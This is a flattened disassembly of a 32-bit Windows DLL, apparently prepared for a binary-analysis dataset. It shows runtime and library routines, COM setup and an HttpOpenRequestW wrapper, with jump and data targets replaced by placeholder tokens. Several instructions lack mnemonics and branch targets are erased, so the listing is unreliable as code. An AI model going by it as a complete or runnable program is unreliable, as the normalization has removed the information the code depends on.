lea eax [ esi + 0x40 ]
jb r-xdata
lea ecx [ esi + 0x5c ]
mov ecx [ esi + 0x5c ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ esi + 0xc8 ]
call eax
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x0
push ecx
mov ecx [ esi + 0xc8 ]
push 0x3
push eax
call ecx
mov eax [ eax ]
cmp [ esi + 0x54 ] edx
lea eax [ esi + 0x40 ]
jb r-xdata
mov ecx eax
mov [ esi + 0xc0 ] eax
test ecx ecx
jne r-xdata
cmp [ esi + 0x18 ] 0x8
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
lea eax [ ecx + 0x2 ]
pop esi
retn
movzx edx [ esi + 0x20 ]
push 0x0
push 0x4000000
push 0x3
push 0x0
push 0x0
push edx
push eax
mov eax [ esi + 0xd0 ]
push ecx
call eax
mov [ esi + 0xc4 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ esi + 0x6c ]
push r--data
xor edi edi
lea ecx [ esi + 0x5c ]
call sub_1001a2f0
test eax eax
je r-xdata
mov ecx [ esi + 0xc0 ]
mov edx [ esi + 0xd8 ]
push ecx
call edx
mov [ esi + 0xc0 ] edi
pop edi
pop ebx
mov eax 0x3
pop esi
retn
pop edi
pop ebx
xor eax eax
pop esi
retn
mov eax [ esi + 0x88 ]
lea ebx [ esi + 0x78 ]
push r--data
mov ecx ebx
call sub_1001a2f0
test eax eax
je r-xdata
mov eax [ esi + 0xa4 ]
lea ebx [ esi + 0x94 ]
push r--data
xor edi edi
mov ecx ebx
call sub_1001a2f0
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x8
mov eax [ esi + 0x88 ]
jb r-xdata
cmp [ ebx + 0x14 ] 0x8
mov eax [ esi + 0xa4 ]
jb r-xdata
mov ecx [ esi + 0xcc ]
push eax
mov eax [ esi + 0xc4 ]
push ebx
push 0x2b
push eax
call ecx
test eax eax
jne r-xdata
mov ebx [ ebx ]
mov edx [ esi + 0xc4 ]
push eax
mov eax [ esi + 0xcc ]
push ebx
push 0x2c
push edx
call eax
test eax eax
jne r-xdata
mov ebx [ ebx ]
pop edi
pop ebx
mov eax 0x4
pop esi
retn
pop edi
pop ebx
mov eax 0x5
pop esi
retn
sub_100123b0
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
mov ebx edi
push esi
lea esi [ eax + 0x1c ]
sub ebx eax
push 0xffffffff
push 0x0
push edi
mov ecx eax
call sub_100404a0
mov eax [ ebx + esi ]
add [ ebp - 0x4 ] 0x24
mov [ esi ] eax
mov ecx [ ebx + esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] ecx
add edi 0x24
add esi 0x24
cmp edi [ ebp + 0x8 ]
jne r-xdata
pop esi
pop ebx
sub_100123f9
push 0x14
push r--data
call sub_1007fb20
or [ ebp - 0x20 ] 0xffffffff
call sub_10044649
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_10059dd7
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_10080b27
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1002fb6b
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1007fb65
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_10021152
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10035d06
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_10035d06
pop ecx
push 0xd
call sub_10058c10
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001255a
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_10035d06
pop ecx
sub_10012593
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005fee9
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10012630
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
push edi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
push r--data
call sub_1002d84e
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x10 ]
cmp eax edx
jb r-xdata
mov edi [ ebp + 0x14 ]
sub eax edx
cmp eax edi
jae r-xdata
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_1000831a
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
push ebx
lea ebx [ ecx + edi ]
mov [ ebp + 0x14 ] ebx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_1000831a
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_1003f800
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov [ eax ] bl
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x10 ]
sub edx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push edx
add ecx ebx
add eax ebx
push ecx
add eax edi
push eax
call sub_1007ec90
mov ecx [ ebp + 0xc ]
add esp 0xc
cmp esi ecx
jne r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + ecx ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + ecx ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
add ecx [ ebp + 0x10 ]
push edi
push ecx
add eax ebx
push eax
call sub_1007f5d0
push edi
add ecx edx
mov eax esi
push ecx
add eax ebx
push eax
call sub_1007ec90
jmp r-xdata
mov eax [ esi ]
push edi
add ecx edx
push ecx
add eax ebx
push eax
call sub_1007ec90
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx [ ebp + 0x14 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_100127b0
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov eax [ ecx + 0x20 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov eax edx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_10012800
push ebp
mov ebp esp
push 0xffffffff
push sub_100886e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x71c71c7
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_1000831a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_100627e0
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10030d30
mov edi [ esi + 0x4 ]
mov ecx [ esi ]
mov edx edi
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax + eax * 8 ]
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx * 4 ]
lea edx [ ebx + ebx * 8 ]
mov [ esi + 0x8 ] ecx
lea ecx [ eax + edx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
mov eax ecx
call sub_100699f0
mov ecx [ esi ]
push ecx
call sub_100187af
add esp 0x4
sub_100128f4
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_1000959d
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10032374
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
sar eax 0x1
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_100129a0
push 0x0
push 0x0
call [ CoInitializeEx@IAT ]
mov [ esi ] eax
test eax eax
js r-xdata
mov eax [ esi ]
retn
lea eax [ esi + 0x4 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov [ esi ] eax
test eax eax
jns r-xdata
call [ CoUninitialize@IAT ]
sub_100129d7
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10053eca
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10012a74
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10012afe
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_10012bd0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
movzx esi ax
mov eax esi
shl esi 0x10
push edi
or eax esi
shr ecx 0x1
mov edi edx
[ edi ]
adc ecx ecx
[ edi ]
pop edi
mov eax edx
pop esi
pop ebp
retn
sub_10012c10
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1005c9e0
mov [ esi ] ax
add esi 0x2
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10012c43
push 0x60
mov eax sub_10085749
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
inc ebx
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x6c ] eax
mov ecx esi
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10013950
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_1006f961
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10034a80
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10013950
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10002fc0
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10034a80
push edi
xor eax eax
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
call sub_1004e370
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_100194f0
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10017b50
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10063060
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10046e20
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10042810
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10017b50
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10063060
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004c1a2
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10063060
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10012e10
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10012e73
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021693
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b079
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004f145
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021026
jmp r-xdata
sub_10012f2b
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10067cb0
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10012fd0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
xor edi edi
mov ecx ebx
mov [ esi ] r--data
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
call sub_1001c970
fldz
fstp [ esi + 0x10 ]
mov [ esi ] r--data
mov [ esi + 0xc ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x58
call sub_10053240
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x24 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x24 ]
push ecx
push edi
push eax
mov [ esi + 0xc ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] 0x0
fld [ ebx + 0x10 ]
mov ecx [ ebp - 0x4 ]
fstp [ esi + 0x10 ]
mov edx [ ebx + 0x18 ]
pop edi
mov [ esi + 0x18 ] edx
mov eax esi
xor ecx ebp
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1001307f
push 0x10
push r--data
call sub_1007fb20
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_100427ff
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb65
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10013b34
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1006299d
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_100473b3
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001313b
mov eax [ ebp - 0x1c ]
sub_10013143
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_10013180
push ebp
mov ebp esp
push 0xffffffff
push sub_10084f5b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp edx 0x5
ja r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x20 ]
or edx 0x400000
push edx
mov edx [ ebp + 0x18 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx ]
push eax
call [ HttpOpenRequestW@IAT ]
xor ecx ecx
mov esi eax
test esi esi
setne cl
push ecx
call sub_1002cbe0
add esp 0x4
test esi esi
je r-xdata
jmp [ edx * 4 + jump_table_10013244 ]
xor eax eax
push 0x8
call sub_1001f84c
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
push esi
mov ecx eax
call sub_10010b30
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
sub_10013260
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a0db
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0x80
call sub_10045930
xor eax eax
mov [ ebp - 0xdc ] ax
mov eax edx
mov [ ebp - 0xc8 ] 0x7
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x2 ]
nop
xor eax eax
jmp r-xdata
push 0x1503
push sub_10008980
push sub_10068260
push sub_1000bda0
push 0x0
push edi
push r--data
push eax
mov eax [ esi + 0x38c ]
mov [ esi + 0x40 ] 0x1
call eax
add esp 0x20
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0xdc ]
call sub_1005ddc0
lea edx [ ebp - 0xdc ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x0
call sub_100205a0
cmp [ ebp - 0xc8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
